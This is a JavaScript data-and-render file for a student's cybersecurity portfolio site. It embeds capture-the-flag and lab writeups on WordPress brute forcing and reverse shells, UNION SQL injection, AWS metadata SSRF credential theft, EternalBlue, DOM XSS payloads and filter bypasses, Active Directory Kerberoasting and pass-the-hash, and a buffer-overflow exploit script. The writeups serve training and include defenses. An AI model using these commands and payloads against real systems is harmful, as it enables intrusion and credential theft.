/* === DATA === */
const PROJECTS = [
  {
    tag: "FRAMEWORK // PENTESTING",
    title: "PENTURION",
    desc: "Automated web pentesting framework (in development). Chains reconnaissance, enumeration, vulnerability scanning and exploitation workflows into a modular pipeline.",
    stack: ["Python", "Bash", "Nmap", "Gobuster", "SQLmap", "Metasploit"],
    github: "https://github.com/ArunKumarL", demo: "#"
  },
  {
    tag: "APPLICATION // PYTHON",
    title: "Adaptive Weather Monitor",
    desc: "Real-time weather application with adaptive UI themes, ambient audio, and animated transitions. Integrates OpenWeather API for live geolocation, temperature, and atmospheric data.",
    stack: ["Python", "KivyMD", "OpenWeather API"],
    github: "https://github.com/ArunKumarL", demo: "#"
  },
  {
    tag: "TOOL // REDTEAM",
    title: "Advanced Reverse Shell",
    desc: "Controlled reverse shell for penetration testing — supports remote command execution, secure file transfer, privilege checks, and persistence mechanisms.",
    stack: ["Python", "TCP Networking", "Windows", "Linux"],
    github: "https://github.com/ArunKumarL", demo: "#"
  },
  {
    tag: "PLATFORM // FULLSTACK",
    title: "Cybersecurity Portfolio",
    desc: "This site. Full-stack portfolio with FastAPI backend, MongoDB storage, file upload for walkthroughs, CTF tracker, and writeup reader.",
    stack: ["HTML", "CSS", "JS", "FastAPI", "MongoDB"],
    github: "https://github.com/ArunKumarL", demo: "#"
  },
];

const WRITEUPS = [
  {
    platform: "tryhackme", platformLabel: "TryHackMe",
    title: "Mr. Robot CTF — Full Walkthrough",
    excerpt: "Root the machine inspired by Mr. Robot. Covers WordPress exploitation, privilege escalation via SUID binaries.",
    date: "2024-12-15", diff: "medium",
    tags: ["wordpress", "suid", "privesc", "web"],
    content: `
## Overview
This room on TryHackMe is inspired by the Mr. Robot TV show. We need to find 3 hidden flags on the machine. Difficulty is **medium** and covers WordPress enumeration, brute-forcing, and Linux privilege escalation.

**Target IP:** \`10.10.x.x\`
**Flags:** 3

---

## Reconnaissance

### Nmap Scan
\`\`\`bash
nmap -sV -sC -oN nmap.txt 10.10.x.x
\`\`\`
**Results:**
- Port 22 — SSH (closed)
- Port 80 — HTTP (Apache)
- Port 443 — HTTPS (Apache)

### Web Enumeration
Visiting the site shows an interactive Mr. Robot themed page. Let's run Gobuster:

\`\`\`bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
\`\`\`

Found:
- \`/wp-admin\` — WordPress login
- \`/robots.txt\` — Interesting!
- \`/wp-content\`

---

## Flag 1

Checking \`/robots.txt\`:
\`\`\`
User-agent: *
fsocity.dic
key-1-of-3.txt
\`\`\`

**FLAG 1:** \`073403c8a58a1f80d943455fb30724b9\`

We also grab the wordlist \`fsocity.dic\` — this will be used for brute-forcing.

---

## Gaining Access — WordPress Brute Force

### Find Username
Use WPScan to enumerate users:
\`\`\`bash
wpscan --url http://10.10.x.x --enumerate u
\`\`\`
Found username: **elliot**

### Brute Force Password
\`\`\`bash
# Remove duplicate lines from wordlist first
sort -u fsocity.dic > fsocity_clean.dic

wpscan --url http://10.10.x.x --usernames elliot --passwords fsocity_clean.dic
\`\`\`
**Credentials found:** \`elliot : ER28-0652\`

### Upload Reverse Shell
1. Login to \`/wp-admin\`
2. Navigate to **Appearance → Editor → 404.php**
3. Replace with PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
4. Set your IP and port in the shell
5. Start listener: \`nc -lvnp 4444\`
6. Navigate to a non-existent page to trigger 404.php

\`\`\`bash
nc -lvnp 4444
# Got shell as daemon
\`\`\`

---

## Flag 2 — Privilege Escalation to Robot

\`\`\`bash
# Stabilise shell
python -c 'import pty;pty.spawn("/bin/bash")'

# Check /home
ls /home/robot
# key-2-of-3.txt  password.raw-md5
\`\`\`

The file \`password.raw-md5\` contains:
\`\`\`
robot:c3fcd3d76192e4007dfb496cca67e13b
\`\`\`

Crack it with hashcat or check crackstation.net:
\`\`\`bash
hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt
# Result: abcdefghijklmnopqrstuvwxyz
\`\`\`

Switch user:
\`\`\`bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
cat key-2-of-3.txt
\`\`\`
**FLAG 2:** \`822c73956184f694993bebb3eb32f0bf\`

---

## Flag 3 — Root via SUID Nmap

Find SUID binaries:
\`\`\`bash
find / -perm -4000 2>/dev/null
\`\`\`

Nmap is SUID! Old versions of nmap have an interactive mode:
\`\`\`bash
nmap --interactive
nmap> !sh
# Root shell!
cat /root/key-3-of-3.txt
\`\`\`
**FLAG 3:** \`04787ddef27c3dee1ee161b21670b4e4\`

---

## Summary

| Step | Technique |
|------|-----------|
| Recon | Nmap, Gobuster |
| Flag 1 | robots.txt |
| Access | WPScan brute force → reverse shell |
| Flag 2 | MD5 hash crack → su |
| Flag 3 | SUID nmap interactive mode |

**Lessons learned:** Always check robots.txt. WordPress sites are goldmines. SUID binaries are common privesc vectors — always run \`find / -perm -4000\`.
    `
  },
  {
    platform: "portswigger", platformLabel: "PortSwigger",
    title: "SQL Injection — UNION Attack Lab",
    excerpt: "Step-by-step exploitation of a UNION-based SQL injection to extract database contents from the backend.",
    date: "2024-12-10", diff: "easy",
    tags: ["sqli", "union", "web", "portswigger"],
    content: `
## Lab Description
**Lab:** SQL injection UNION attack, retrieving data from other tables
**Goal:** Perform a UNION attack to retrieve all usernames and passwords from the \`users\` table and log in as the \`administrator\`.

---

## Step 1 — Confirm Injection Point

The application filters products by category. Inject a single quote:
\`\`\`
/filter?category=Gifts'
\`\`\`
Server returns an error — **injection confirmed**.

---

## Step 2 — Determine Number of Columns

Use ORDER BY to find column count:
\`\`\`sql
/filter?category=Gifts' ORDER BY 1--
/filter?category=Gifts' ORDER BY 2--
/filter?category=Gifts' ORDER BY 3--   ← Error here
\`\`\`
**Result:** 2 columns.

---

## Step 3 — Find String Columns

\`\`\`sql
/filter?category=Gifts' UNION SELECT 'a','b'--
\`\`\`
Both columns return strings. ✓

---

## Step 4 — Extract Data from users Table

\`\`\`sql
/filter?category=Gifts' UNION SELECT username,password FROM users--
\`\`\`

**Response contains:**
\`\`\`
administrator | r0wt3d_p@ssw0rd
wiener       | peter
carlos       | montoya
\`\`\`

---

## Step 5 — Login

Navigate to \`/login\` and use:
- Username: \`administrator\`
- Password: \`r0wt3d_p@ssw0rd\`

**Lab Solved ✓**

---

## Key Takeaways
- Always probe ORDER BY first to count columns
- UNION requires matching column count and compatible data types
- \`--\` or \`#\` are common comment sequences to terminate the original query
    `
  },
  {
    platform: "daily", platformLabel: "Daily",
    title: "Understanding SSRF in Cloud Environments",
    excerpt: "Server-Side Request Forgery attacks targeting AWS metadata endpoints. Real-world case studies and mitigations.",
    date: "2024-12-08", diff: "hard",
    tags: ["ssrf", "aws", "cloud", "web"],
    content: `
## What is SSRF?

Server-Side Request Forgery (SSRF) is a vulnerability where an attacker tricks the server into making HTTP requests to an unintended destination — including internal services or cloud metadata endpoints.

---

## Why Cloud SSRF is Critical

In AWS environments, every EC2 instance has access to the **Instance Metadata Service (IMDS)** at:
\`\`\`
http://169.254.169.254/latest/meta-data/
\`\`\`

If SSRF is exploited, an attacker can retrieve **IAM credentials** tied to the EC2 role:

\`\`\`bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name, e.g. "s3-access-role"

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-access-role
\`\`\`

**Response:**
\`\`\`json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI...",
  "Token": "AQoXnyc4lcK4...",
  "Expiration": "2024-12-09T00:00:00Z"
}
\`\`\`

These temporary credentials can be used to access S3 buckets, Lambda functions, RDS — anything the IAM role permits.

---

## Real-World Example: Capital One Breach (2019)

A misconfigured WAF on an EC2 instance allowed an attacker to perform SSRF and retrieve IAM role credentials via the metadata endpoint. This led to exfiltration of 100 million customer records from S3.

---

## Exploitation Workflow

\`\`\`
1. Find SSRF parameter
   e.g. ?url=https://example.com/image.jpg

2. Test internal access
   ?url=http://127.0.0.1/admin

3. Hit metadata endpoint
   ?url=http://169.254.169.254/latest/meta-data/

4. Extract IAM creds
   ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE

5. Use creds with AWS CLI
   export AWS_ACCESS_KEY_ID=...
   aws s3 ls
\`\`\`

---

## IMDSv2 — The Fix

AWS introduced **IMDSv2** which requires a session token obtained via a PUT request first:

\`\`\`bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
\`\`\`

SSRF via GET requests can no longer hit the metadata endpoint when IMDSv2 is enforced.

---

## Mitigations

| Defense | Description |
|---------|-------------|
| Enforce IMDSv2 | Block unauthenticated GET to 169.254.169.254 |
| Block metadata IP at firewall | Prevent outbound to 169.254.169.254 |
| Input validation | Allowlist valid URL schemes/hosts |
| Least privilege IAM | Limit damage if creds are stolen |
| VPC endpoint policies | Restrict what the role can access |
    `
  },
  {
    platform: "picoctf", platformLabel: "PicoCTF",
    title: "Forensics: Wireshark doo dooo",
    excerpt: "Network traffic analysis challenge. Filtering HTTP streams, following TCP, extracting credentials from cleartext.",
    date: "2024-12-05", diff: "easy",
    tags: ["forensics", "wireshark", "pcap", "network"],
    content: `
## Challenge Description
**Category:** Forensics
**Points:** 50
**File:** \`shark1.pcapng\`

We're given a packet capture file. Find the flag!

---

## Step 1 — Open in Wireshark

\`\`\`bash
wireshark shark1.pcapng
\`\`\`

The capture contains a mix of TCP, HTTP and DNS traffic.

---

## Step 2 — Filter HTTP Traffic

In the filter bar:
\`\`\`
http
\`\`\`

We can see some HTTP GET and POST requests. Let's look at the POST requests — they often carry credentials or sensitive data.

---

## Step 3 — Follow TCP Stream

Right-click any HTTP packet → **Follow → TCP Stream**

In one of the streams we see:
\`\`\`
POST /login HTTP/1.1
Host: challenge.picoctf.org
Content-Type: application/x-www-form-urlencoded

username=admin&password=th3_p4ck3ts_kn0w
\`\`\`

---

## Step 4 — Search for Flag Pattern

Use **Edit → Find Packet** (Ctrl+F):
- Search in: Packet bytes
- String: \`picoCTF{\`

Found in packet #1337:
\`\`\`
picoCTF{p4ck3t_5n1ff3r_4_lif3}
\`\`\`

---

## Flag
\`\`\`
picoCTF{p4ck3t_5n1ff3r_4_lif3}
\`\`\`

---

## Takeaways
- HTTP traffic is cleartext — never send credentials over HTTP
- Always use \`Follow TCP Stream\` to reconstruct full conversations
- The string search in Wireshark is a fast way to find flags in large captures
    `
  },
  {
    platform: "tryhackme", platformLabel: "TryHackMe",
    title: "Blue — EternalBlue MS17-010",
    excerpt: "Classic Windows exploitation using the NSA EternalBlue exploit. SMB exploitation and Meterpreter post-exploitation.",
    date: "2024-12-01", diff: "medium",
    tags: ["windows", "eternalblue", "metasploit", "smb"],
    content: `
## Overview
**Room:** Blue
**OS:** Windows 7
**Vulnerability:** MS17-010 (EternalBlue)

EternalBlue is an NSA exploit leaked by Shadow Brokers in 2017. It targets a buffer overflow in Windows SMB and was used in the WannaCry ransomware attack.

---

## Step 1 — Scan

\`\`\`bash
nmap -sV -sC --script vuln 10.10.x.x
\`\`\`

Key findings:
- Port 445/tcp — microsoft-ds (SMB)
- **VULNERABLE: ms17-010** — EternalBlue detected

---

## Step 2 — Exploit with Metasploit

\`\`\`bash
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.x.x
set LHOST 10.10.x.x   # your TryHackMe VPN IP
set PAYLOAD windows/x64/shell/reverse_tcp
run
\`\`\`

Shell obtained as **NT AUTHORITY\\SYSTEM** (highest privilege).

---

## Step 3 — Upgrade to Meterpreter

Background the shell with Ctrl+Z, then:
\`\`\`bash
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
\`\`\`

Now we have a full Meterpreter session.

---

## Step 4 — Post Exploitation

### Dump Password Hashes
\`\`\`bash
meterpreter> hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
\`\`\`

Crack Jon's hash on crackstation.net → **alqfna22**

### Find Flags

\`\`\`bash
meterpreter> search -f flag*.txt
# flag1.txt — C:\
# flag2.txt — C:\Windows\System32\config
# flag3.txt — C:\Users\Jon\Documents
\`\`\`

---

## Summary

| Phase | Tool/Technique |
|-------|---------------|
| Scan | Nmap vuln scripts |
| Exploit | Metasploit ms17_010_eternalblue |
| Escalate | Already SYSTEM |
| Persist | shell_to_meterpreter |
| Loot | hashdump, file search |

**Patch:** Apply MS17-010 security update. Disable SMBv1.
    `
  },
  {
    platform: "portswigger", platformLabel: "PortSwigger",
    title: "XSS: DOM-Based Vulnerabilities",
    excerpt: "Exploiting DOM sinks in JavaScript code. Bypassing WAF filters and chaining with CSRF for account takeover.",
    date: "2024-11-28", diff: "hard",
    tags: ["xss", "dom", "javascript", "web"],
    content: `
## What is DOM-Based XSS?

DOM XSS occurs when JavaScript reads attacker-controlled data from the DOM (a **source**) and passes it to a dangerous function (a **sink**) without sanitisation.

Common **sources:** \`location.hash\`, \`location.search\`, \`document.referrer\`, \`postMessage\`
Common **sinks:** \`innerHTML\`, \`eval()\`, \`document.write()\`, \`setTimeout()\`

---

## Lab: DOM XSS in innerHTML sink

**Goal:** Call \`alert(document.domain)\`

The search box reflects input into:
\`\`\`javascript
document.getElementById('searchMessage').innerHTML = query;
\`\`\`

The \`innerHTML\` sink doesn't execute \`<script>\` tags, but **does** execute event handlers:

\`\`\`html
<img src=x onerror=alert(document.domain)>
\`\`\`

Enter this as the search query → alert fires. **Lab solved.**

---

## Lab: DOM XSS via postMessage

The page has a listener:
\`\`\`javascript
window.addEventListener('message', function(e) {
  document.getElementById('ads').innerHTML = e.data;
});
\`\`\`

No origin check! We craft an iframe on our exploit server:
\`\`\`html
<iframe src="https://TARGET" onload="
  this.contentWindow.postMessage('<img src=x onerror=print()>','*')
">
\`\`\`

Deliver to victim — the \`print()\` fires in their browser context.

---

## Bypassing WAF Filters

When \`<script>\` and \`onerror\` are filtered:

\`\`\`html
<!-- SVG with animate -->
<svg><animate onbegin=alert(1) attributeName=x></svg>

<!-- Details tag -->
<details open ontoggle=alert(1)>

<!-- Using encoding -->
<img src=x onerror=&#97;lert(1)>
\`\`\`

---

## Chaining DOM XSS → Account Takeover

1. Find XSS in a page with CSRF token in DOM
2. Use XSS to read token: \`document.querySelector('[name=csrf]').value\`
3. Submit state-changing request with stolen token
4. Change victim's email → trigger password reset → account takeover

---

## Defenses

- Use \`textContent\` instead of \`innerHTML\` for untrusted data
- Implement a strict **Content Security Policy (CSP)**
- Sanitise with DOMPurify before inserting HTML
- Avoid passing user input to dangerous sinks
    `
  },
  {
    platform: "daily", platformLabel: "Daily",
    title: "Active Directory Attack Paths",
    excerpt: "Kerberoasting, AS-REP Roasting and Pass-the-Hash attacks in a simulated enterprise Active Directory environment.",
    date: "2024-11-25", diff: "hard",
    tags: ["active-directory", "kerberoast", "windows", "privesc"],
    content: `
## Active Directory Attack Overview

Active Directory (AD) is used by ~90% of Fortune 500 companies. Compromising AD = compromising the entire organisation. Here are three key attack paths.

---

## 1. Kerberoasting

**Concept:** Any authenticated domain user can request a Kerberos service ticket (TGS) for any service. The ticket is encrypted with the service account's NTLM hash — which we can crack offline.

**Requirements:** Valid domain credentials (even low privilege)

\`\`\`bash
# Using impacket
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10 -request

# Using Rubeus (on Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
\`\`\`

**Crack the hash:**
\`\`\`bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
\`\`\`

**Defense:** Use strong passwords (25+ chars) for service accounts. Enable AES encryption. Use gMSA (Group Managed Service Accounts).

---

## 2. AS-REP Roasting

**Concept:** If a user account has **"Do not require Kerberos preauthentication"** enabled, we can request an AS-REP without credentials. The response contains data encrypted with the user's hash.

\`\`\`bash
# Enumerate vulnerable accounts (no creds needed)
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10

# Crack
hashcat -m 18200 asrep_hashes.txt rockyou.txt
\`\`\`

**Defense:** Require Kerberos preauthentication on all accounts (default setting — don't disable it).

---

## 3. Pass-the-Hash (PtH)

**Concept:** Windows NTLM authentication accepts the hash directly — no need to crack it. Once you have a hash from \`secretsdump\` or Mimikatz, you can authenticate anywhere that hash is valid.

\`\`\`bash
# Dump hashes (requires admin on target)
secretsdump.py domain/Administrator:password@192.168.1.10

# PtH with CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H aad3b435b51404ee:31d6cfe0d16ae931

# PtH with impacket
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.10
\`\`\`

**Defense:** Enable Protected Users group. Use Credential Guard. Disable NTLM where possible.

---

## Attack Path Summary

\`\`\`
Low priv user
    ↓ Kerberoast / AS-REP
Service account hash
    ↓ Crack / PtH
Admin on workstation
    ↓ Dump LSASS
Domain Admin hash
    ↓ DCSync
All domain hashes → Full compromise
\`\`\`
    `
  },
  {
    platform: "picoctf", platformLabel: "PicoCTF",
    title: "Binary Exploitation: Buffer Overflow 1",
    excerpt: "Classic stack buffer overflow to overwrite return address and redirect execution to win function.",
    date: "2024-11-20", diff: "medium",
    tags: ["binary", "bof", "pwn", "exploit"],
    content: `
## Challenge Description
**Category:** Binary Exploitation
**Points:** 200
**Files:** \`vuln\`, \`vuln.c\`

A classic stack buffer overflow. Overwrite the return address to jump to the \`win()\` function.

---

## Source Code Analysis

\`\`\`c
#include <stdio.h>
#include <string.h>

void win() {
  puts("Congrats! Here's your flag:");
  system("cat flag.txt");
}

void vuln() {
  char buf[32];
  gets(buf);   // DANGEROUS — no bounds check!
}

int main() {
  vuln();
  return 0;
}
\`\`\`

**\`gets()\` is the vulnerability** — it reads unlimited bytes into a 32-byte buffer.

---

## Step 1 — Find the Offset

Use \`cyclic\` from pwntools to find where we overwrite EIP:

\`\`\`bash
python3 -c "from pwn import *; print(cyclic(100).decode())" | ./vuln
# Program crashes

# In GDB:
gdb ./vuln
run
# Feed cyclic pattern, read EIP value
python3 -c "from pwn import *; print(cyclic_find(0x61616174))"
# Offset: 44
\`\`\`

---

## Step 2 — Find win() Address

\`\`\`bash
objdump -d vuln | grep win
# 080491f6 <win>:
\`\`\`

Address: \`0x080491f6\`

---

## Step 3 — Build Exploit

\`\`\`python
from pwn import *

# Connect to remote or local
p = remote('mercury.picoctf.net', 35866)
# p = process('./vuln')

offset = 44
win_addr = 0x080491f6

payload = b'A' * offset
payload += p32(win_addr)   # Little-endian 32-bit

p.sendlineafter(b'>', payload)
print(p.recvall().decode())
\`\`\`

---

## Step 4 — Run Exploit

\`\`\`bash
python3 exploit.py
# Congrats! Here's your flag:
# picoCTF{addr3ss3s_ar3_3asy_w1th_p4yl04ds}
\`\`\`

---

## Flag
\`\`\`
picoCTF{addr3ss3s_ar3_3asy_w1th_p4yl04ds}
\`\`\`

---

## Key Concepts
- Stack grows **downward** — local variables before saved return address
- Overflowing the buffer overwrites saved EIP/RIP
- \`p32()\` / \`p64()\` handles little-endian packing
- Always check for NX, ASLR, canaries: \`checksec ./vuln\`
    `
  },
];

const CTF_CHALLENGES = [
  { id: "001", name: "Pickle Rick", platform: "TryHackMe", category: "Web / LFI", diff: "easy", status: "solved" },
  { id: "002", name: "SQL Injection UNION (Lab 1)", platform: "PortSwigger", category: "SQLi", diff: "easy", status: "solved" },
  { id: "003", name: "Wireshark doo dooo", platform: "PicoCTF", category: "Forensics", diff: "easy", status: "solved" },
  { id: "004", name: "Buffer Overflow 1", platform: "PicoCTF", category: "Binary Exploit", diff: "medium", status: "solved" },
  { id: "005", name: "XSS DOM-Based", platform: "PortSwigger", category: "XSS", diff: "hard", status: "solved" },
  { id: "006", name: "Mr. Robot", platform: "TryHackMe", category: "Web / PrivEsc", diff: "medium", status: "solved" },
  { id: "007", name: "Blind SQLi Time-Based", platform: "PortSwigger", category: "SQLi", diff: "hard", status: "progress" },
  { id: "008", name: "ROP Emporium ret2win", platform: "PicoCTF", category: "Binary Exploit", diff: "hard", status: "progress" },
];

const OFFENSIVE_SKILLS = [
  { name: "Reconnaissance & Enumeration", pct: 88 },
  { name: "Vulnerability Scanning", pct: 85 },
  { name: "Exploitation Workflows", pct: 78 },
  { name: "Linux Administration", pct: 82 },
];
const WEB_SKILLS = [
  { name: "OWASP Top 10 Testing", pct: 85 },
  { name: "Input / Session Testing", pct: 80 },
  { name: "Directory & Param Enumeration", pct: 88 },
  { name: "Network Traffic Analysis", pct: 82 },
];
const TOOLS = ["Nmap","Burp Suite","Metasploit","Wireshark","SQLmap","Hydra","Netcat","John the Ripper","Python","Bash","Javascript","Linux"];
const CERTS = [
  { icon: "🛡️", name: "Ethical Hacking & Bug Hunting", issuer: "Cyfotok Infosec" },
  { icon: "🎯", name: "TryHackMe — Top 2% Hacker", issuer: "TryHackMe" },
  { icon: "🤖", name: "SIH 2025 Selected", issuer: "Smart India Hackathon" },
  { icon: "🏆", name: "HackRx 6.0 Pre-Finals", issuer: "Bajaj Finserv" },
];

/* === BOOT SEQUENCE === */
const bootLines = [
  "BIOS v2.1.0 — Initializing secure boot...",
  "Loading kernel modules [▓▓▓▓▓▓▓▓▓▓] 100%",
  "Starting network services... [ OK ]",
  "Mounting encrypted volumes... [ OK ]",
  "Loading firewall rules (iptables)... [ OK ]",
  "Establishing VPN tunnel... [ OK ]",
  "Checking for rootkits... CLEAN",
  "Launching portfolio interface...",
  "Access granted. Welcome, operator.",
];

async function runBoot() {
  const log = document.getElementById("boot-log");
  for (const line of bootLines) {
    await sleep(Math.random() * 120 + 60);
    log.innerHTML += `<div><span style="color:var(--accent2)">[${timestamp()}]</span> ${line}</div>`;
  }
  await sleep(600);
  document.getElementById("boot-screen").classList.add("hide");
  document.getElementById("boot-screen").addEventListener("transitionend", () => {
    document.getElementById("boot-screen").style.display = "none";
  });
}

/* === HERO TERMINAL === */
const terminalLines = [
  { text: "kali@Arun1x:~$ whoami", delay: 200, color: "#00ff88" },
  { text: "ArunKumar L — Cybersecurity Intern | B.Tech IT", delay: 400 },
  { text: "kali@Arun1x:~$ cat skills.txt", delay: 800, color: "#00ff88" },
  { text: "► Reconnaissance, Enumeration, Exploitation", delay: 300 },
  { text: "► OWASP Top 10 · Burp Suite · Metasploit", delay: 200 },
  { text: "► TryHackMe Top 2% · 120+ labs completed", delay: 200 },
  { text: "► Python · Bash · JavaScript Scripting", delay: 200 },
  { text: "kali@Arun1x:~$ ls projects/", delay: 800, color: "#00ff88" },
  { text: "PENTURION/  reverse-shell/  weather-app/", delay: 300, color: "#00cfff" },
  { text: "kali@Arun1x:~$ cat target.txt", delay: 700, color: "#00ff88" },
  { text: "Target: Cybersecurity Intern / SOC Analyst Intern", delay: 300, color: "#ffaa00" },
  { text: "kali@Arun1x:~$ █", delay: 600, color: "#00ff88" },
];

async function runTerminal() {
  const body = document.getElementById("heroTerminal");
  if (!body) return;
  for (const line of terminalLines) {
    await sleep(line.delay);
    const div = document.createElement("div");
    div.style.color = line.color || "var(--text)";
    div.style.opacity = "0";
    div.style.transition = "opacity 0.3s";
    div.textContent = line.text;
    body.appendChild(div);
    requestAnimationFrame(() => { div.style.opacity = "1"; });
    body.scrollTop = body.scrollHeight;
  }
}

/* === RENDER FUNCTIONS === */
function renderProjects() {
  const grid = document.getElementById("projectsGrid");
  grid.innerHTML = PROJECTS.map(p => `
    <div class="project-card">
      <div class="project-links">
        <a href="${p.github}" class="project-link-btn">GH</a>
        <a href="${p.demo}" class="project-link-btn">↗</a>
      </div>
      <div class="project-tag">${p.tag}</div>
      <div class="project-title">${p.title}</div>
      <div class="project-desc">${p.desc}</div>
      <div class="project-stack">${p.stack.map(s => `<span class="stack-tag">${s}</span>`).join("")}</div>
    </div>
  `).join("");
}

function platformClass(p) {
  return p === "tryhackme" ? "thm" : p === "portswigger" ? "ps" : p === "picoctf" ? "pico" : "daily";
}

const API_BASE = "http://localhost:8000";
let allWriteups = [];   // cached from API

/* Render cards from data array (API or fallback) */
function renderWriteupCards(data) {
  const grid = document.getElementById("writeupsGrid");
  if (!data.length) {
    grid.innerHTML = `<div style="font-family:var(--font-mono);color:var(--text-dim);font-size:0.85rem;padding:2rem 0">
      // No writeups found. Upload your first walkthrough via the API.</div>`;
    return;
  }
  grid.innerHTML = data.map(w => `
    <a class="writeup-card" href="writeup.html?slug=${w.slug || w._id}" style="text-decoration:none;display:block;cursor:pointer;">
      <div class="writeup-meta">
        <span class="writeup-platform platform-${platformClass(w.platform)}">${w.platform_label || w.platformLabel}</span>
        <span class="writeup-date">${w.date}</span>
      </div>
      <div class="writeup-title">${w.title}</div>
      <div class="writeup-excerpt">${w.excerpt}</div>
      <div class="writeup-footer">
        <div class="writeup-diff diff-${w.difficulty || w.diff}">
          <div class="diff-dot"></div>
          <span class="diff-label">${(w.difficulty || w.diff || "").toUpperCase()}</span>
        </div>
        <div class="writeup-tags">${(w.tags||[]).map(t=>`<span class="wtag">#${t}</span>`).join("")}</div>
        <span class="read-more-btn">READ FULL →</span>
      </div>
    </a>`
  ).join("");
}

/* Fetch from API; fall back to local WRITEUPS if API offline */
async function fetchWriteups(filter = "all") {
  const grid = document.getElementById("writeupsGrid");
  grid.innerHTML = `<div style="font-family:var(--font-mono);color:var(--text-dim);font-size:0.8rem;padding:1rem 0">// Loading writeups...</div>`;
  try {
    const url = filter === "all"
      ? `${API_BASE}/api/writeups`
      : `${API_BASE}/api/writeups?platform=${filter}`;
    const res  = await fetch(url);
    if (!res.ok) throw new Error("API error");
    const json = await res.json();
    allWriteups = json.writeups || [];
    renderWriteupCards(allWriteups);
  } catch {
    // API offline — use local WRITEUPS data as fallback
    const data = filter === "all" ? WRITEUPS : WRITEUPS.filter(w => w.platform === filter);
    // Convert local format to match API format
    const converted = data.map((w, i) => ({
      ...w, slug: `local-${i}`, platform_label: w.platformLabel,
      difficulty: w.diff, _localIdx: i
    }));
    renderWriteupCards(converted);
  }
}

/* Alias for filter buttons */
function renderWriteups(filter = "all") { fetchWriteups(filter); }

/* === MARKDOWN RENDERER (no external lib) === */
function renderMarkdown(md) {
  let html = md
    // Escape HTML first
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    // Code blocks (must come before inline code)
    .replace(/```(\w*)\n([\s\S]*?)```/g, (_, lang, code) =>
      `<pre class="md-pre"><div class="md-pre-header"><span class="md-lang">${lang||'bash'}</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div><code class="md-code">${code.trimEnd()}</code></pre>`)
    // Inline code
    .replace(/`([^`]+)`/g, '<code class="md-inline">$1</code>')
    // Headings
    .replace(/^### (.+)$/gm, '<h3 class="md-h3">$1</h3>')
    .replace(/^## (.+)$/gm, '<h2 class="md-h2">$1</h2>')
    .replace(/^# (.+)$/gm, '<h1 class="md-h1">$1</h1>')
    // Bold
    .replace(/\*\*(.+?)\*\*/g, '<strong class="md-bold">$1</strong>')
    // Italic
    .replace(/\*(.+?)\*/g, '<em>$1</em>')
    // Horizontal rule
    .replace(/^---$/gm, '<hr class="md-hr">')
    // Tables
    .replace(/^\|(.+)\|\n\|[-| :]+\|\n((?:\|.+\|\n?)+)/gm, (_, header, rows) => {
      const ths = header.split('|').filter(c=>c.trim()).map(c=>`<th>${c.trim()}</th>`).join('');
      const trs = rows.trim().split('\n').map(row => {
        const tds = row.split('|').filter(c=>c.trim()).map(c=>`<td>${c.trim()}</td>`).join('');
        return `<tr>${tds}</tr>`;
      }).join('');
      return `<table class="md-table"><thead><tr>${ths}</tr></thead><tbody>${trs}</tbody></table>`;
    })
    // Numbered lists
    .replace(/^\d+\. (.+)$/gm, '<li class="md-li">$1</li>')
    .replace(/(<li class="md-li">.*<\/li>\n?)+/g, m => `<ol class="md-ol">${m}</ol>`)
    // Bullet lists
    .replace(/^- (.+)$/gm, '<li class="md-li">$1</li>')
    .replace(/(<li class="md-li">.*<\/li>\n?)+/g, m => `<ul class="md-ul">${m}</ul>`)
    // Paragraphs (lines not already wrapped)
    .replace(/^(?!<[a-z]|$)(.+)$/gm, '<p class="md-p">$1</p>')
    // Clean up blank lines
    .replace(/\n{3,}/g, '\n\n');
  return html;
}

function copyCode(btn) {
  const code = btn.closest('pre').querySelector('code').textContent;
  navigator.clipboard.writeText(code).then(() => {
    btn.textContent = 'COPIED ✓';
    setTimeout(() => btn.textContent = 'COPY', 2000);
  });
}

/* Full writeup opens as a dedicated page: writeup.html?slug=... */

function renderCTF() {
  const body = document.getElementById("ctfTableBody");
  body.innerHTML = CTF_CHALLENGES.map(c => `
    <tr>
      <td style="color:var(--text-dim)">#${c.id}</td>
      <td>${c.name}</td>
      <td>${c.platform}</td>
      <td style="color:var(--accent2)">${c.category}</td>
      <td><span class="diff-badge diff-${c.diff}">${c.diff.toUpperCase()}</span></td>
      <td class="status-${c.status}">${c.status === "solved" ? "✓ SOLVED" : "⟳ IN PROGRESS"}</td>
    </tr>
  `).join("");
}

function renderSkills() {
  const renderBars = (containerId, skills) => {
    document.getElementById(containerId).innerHTML = skills.map(s => `
      <div class="skill-bar-item">
        <div class="skill-bar-label">
          <span class="skill-name">${s.name}</span>
          <span class="skill-pct">${s.pct}%</span>
        </div>
        <div class="skill-bar-track">
          <div class="skill-bar-fill" data-pct="${s.pct}" style="width:0%"></div>
        </div>
      </div>
    `).join("");
  };
  renderBars("offensiveSkills", OFFENSIVE_SKILLS);
  renderBars("webSkills", WEB_SKILLS);

